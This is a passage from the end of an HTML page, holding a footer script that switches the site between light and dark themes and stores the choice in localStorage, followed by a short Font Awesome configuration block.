	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
